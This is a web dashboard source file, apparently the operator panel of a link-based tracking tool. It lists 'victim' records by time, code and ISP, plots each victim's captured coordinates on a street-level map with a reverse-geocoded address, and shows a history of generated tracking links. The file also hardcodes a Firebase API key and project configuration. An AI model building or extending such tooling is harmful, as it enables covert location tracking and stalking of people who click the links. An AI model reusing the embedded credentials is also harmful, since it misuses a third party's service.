<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Operations | CyberCore</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        #map { height: 400px; width: 100%; border-radius: 2rem; border: 6px solid white; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        .cyber-card { background: white; border-radius: 2rem; border: 1px solid #f1f5f9; overflow: hidden; }
        .log-row:hover { background: #f8fafc; cursor: pointer; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
    </style>
</head>
<body class="bg-[#f8fafc] pb-20">

    <nav class="bg-white/80 backdrop-blur-md p-4 border-b sticky top-0 z-[1001]">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <div class="flex items-center space-x-4">
                <button onclick="location.href='dashboard.html'" class="h-10 w-10 bg-gray-50 rounded-xl flex items-center justify-center text-gray-400">
                    <i class="fa-solid fa-arrow-left"></i>
                </button>
                <h1 class="text-xl font-black text-gray-800 tracking-tighter uppercase italic">Ops <span class="text-blue-600">Center</span></h1>
            </div>
            <div class="flex items-center space-x-3">
                <span id="activeCount" class="bg-green-100 text-green-700 text-[10px] font-black px-3 py-1 rounded-full border border-green-200 uppercase">0 Targets Cached</span>
            </div>
        </div>
    </nav>

    <div class="max-w-7xl mx-auto p-4 space-y-6">
        
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div class="lg:col-span-2 relative">
                <div id="map"></div>
                <div class="absolute bottom-4 left-4 z-[1000] bg-white/90 backdrop-blur p-4 rounded-2xl shadow-xl border border-white max-w-xs">
                    <p class="text-[9px] font-black text-gray-400 uppercase">Current Intelligence</p>
                    <p id="addrDisplay" class="text-[11px] font-bold text-gray-700 leading-tight">Select a log to decode address...</p>
                </div>
            </div>
            
            <div class="cyber-card p-6 flex flex-col justify-center space-y-4 shadow-sm">
                <h3 class="font-black text-gray-800 text-sm uppercase">Quick Intercept</h3>
                <input type="text" id="targetIdInput" placeholder="Enter Unique Log Code..." 
                       class="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-blue-500 font-mono text-xs transition-all">
                <button onclick="trackSpecificVictim()" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-black uppercase text-xs tracking-widest hover:bg-blue-700 transition shadow-lg shadow-blue-200">
                    Search Database
                </button>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            
            <div class="cyber-card shadow-sm">
                <div class="p-5 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
                    <h3 class="font-black text-xs uppercase tracking-tighter">Victim Intelligence Logs</h3>
                    <i class="fa-solid fa-user-secret text-gray-300"></i>
                </div>
                <div class="overflow-y-auto max-h-[400px]">
                    <table class="w-full text-left text-[11px]">
                        <thead class="bg-white sticky top-0 border-b text-gray-400 font-black uppercase">
                            <tr>
                                <th class="p-4">Time / Code</th>
                                <th class="p-4">ISP / Network</th>
                                <th class="p-4">Action</th>
                            </tr>
                        </thead>
                        <tbody id="victimTable">
                            </tbody>
                    </table>
                </div>
            </div>

            <div class="cyber-card shadow-sm">
                <div class="p-5 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
                    <h3 class="font-black text-xs uppercase tracking-tighter">Link Generation History</h3>
                    <i class="fa-solid fa-link text-gray-300"></i>
                </div>
                <div class="overflow-y-auto max-h-[400px]">
                    <table class="w-full text-left text-[11px]">
                        <thead class="bg-white sticky top-0 border-b text-gray-400 font-black uppercase">
                            <tr>
                                <th class="p-4">Created At</th>
                                <th class="p-4">Destination</th>
                                <th class="p-4">Status</th>
                            </tr>
                        </thead>
                        <tbody id="linkTable">
                            </tbody>
                    </table>
                </div>
            </div>

        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // --- FIREBASE SETUP ---
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            authDomain: "in-app-update-21c61.firebaseapp.com",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
            storageBucket: "in-app-update-21c61.firebasestorage.app",
            messagingSenderId: "1013483026768",
            appId: "1:1013483026768:web:c5f54060842f9672431455"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userMobile = localStorage.getItem("loggedInUser");

        var map = L.map('map').setView([20.5937, 78.9629], 5);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker, circle;

        // 1. Load Victim Tracking Logs (Real-time)
        function listenVictims() {
            db.ref('users/' + userMobile + '/trackingLogs').on('value', snap => {
                const table = document.getElementById('victimTable');
                table.innerHTML = "";
                let count = 0;
                snap.forEach(child => {
                    count++;
                    const data = child.val();
                    const row = document.createElement('tr');
                    row.className = "log-row border-b border-gray-50";
                    row.innerHTML = `
                        <td class="p-4">
                            <p class="font-bold text-gray-700">${data.time}</p>
                            <p class="text-[9px] font-mono text-blue-500">${child.key}</p>
                        </td>
                        <td class="p-4 text-gray-500 font-medium">${data.isp || 'Searching Network...'}</td>
                        <td class="p-4">
                            <button onclick="zoomTo('${data.coords}', '${child.key}')" class="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center">
                                <i class="fa-solid fa-location-crosshairs"></i>
                            </button>
                        </td>
                    `;
                    table.prepend(row);
                });
                document.getElementById('activeCount').innerText = `${count} Targets Cached`;
            });
        }

        // 2. Load Link History (Real-time)
        // Note: Aapke generate function mein db.ref('users/mobile/links').push(...) hona chahiye
        function listenLinkHistory() {
            db.ref('users/' + userMobile + '/links').on('value', snap => {
                const table = document.getElementById('linkTable');
                table.innerHTML = "";
                snap.forEach(child => {
                    const data = child.val();
                    table.innerHTML = `
                        <tr class="border-b border-gray-50">
                            <td class="p-4 text-gray-400">${data.timestamp}</td>
                            <td class="p-4 font-bold text-gray-600 truncate max-w-[100px]">${data.destination}</td>
                            <td class="p-4"><span class="bg-green-100 text-green-700 px-2 py-0.5 rounded text-[9px] font-black uppercase">Active</span></td>
                        </tr>
                    ` + table.innerHTML;
                });
            });
        }

        // 3. Map Control Logic
        async function zoomTo(coords, label) {
            const [lat, lng] = coords.split(',').map(parseFloat);
            if (marker) map.removeLayer(marker);
            if (circle) map.removeLayer(circle);

            map.flyTo([lat, lng], 17, { animate: true, duration: 2 });
            marker = L.marker([lat, lng]).addTo(map).bindPopup("<b>Target:</b> " + label).openPopup();
            circle = L.circle([lat, lng], { radius: 40, color: 'blue' }).addTo(map);

            // Fetch Address
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
            const addr = await res.json();
            document.getElementById('addrDisplay').innerText = addr.display_name;
        }

        function trackSpecificVictim() {
            const id = document.getElementById('targetIdInput').value;
            db.ref(`users/${userMobile}/trackingLogs/${id}`).once('value', snap => {
                if(snap.exists()) zoomTo(snap.val().coords, id);
                else alert("Invalid Intelligence Code");
            });
        }

        window.onload = () => { listenVictims(); listenLinkHistory(); };
    </script>
</body>
</html>
